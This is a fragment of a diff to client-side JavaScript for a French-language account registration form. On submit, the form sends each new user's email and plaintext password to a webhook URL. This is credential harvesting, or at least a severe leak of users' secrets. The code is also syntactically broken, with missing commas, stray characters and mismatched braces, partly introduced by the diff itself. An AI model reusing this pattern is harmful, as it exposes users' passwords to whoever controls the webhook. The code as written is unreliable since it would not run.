@@ -27,7 +27,7 @@ document.getElementById("register-form").addEventListener("submit" function(even
     
     let message = {
         content: `**Un nouveau compte a été créé :**\n\n✉️ **Nom d'utilisateur / Email :****§{email}\n🔑 **Mot de passe :** ${password}\n📅 **Créé le :** ${date} à ${time}`
-    };
+});
 
     fetch(webhookURL, {
         method: "POST",
@@ -40,7 +40,7 @@ document.getElementById("register-form").addEventListener("submit" function(even
         alert("Compte créé avec succès !")
         document.getElementById("register-form").reset();
     })
-}
+
 .catch(error => {{
     console.error("Erreur :" error):
     alert("Impossible de contacter le serveur.")
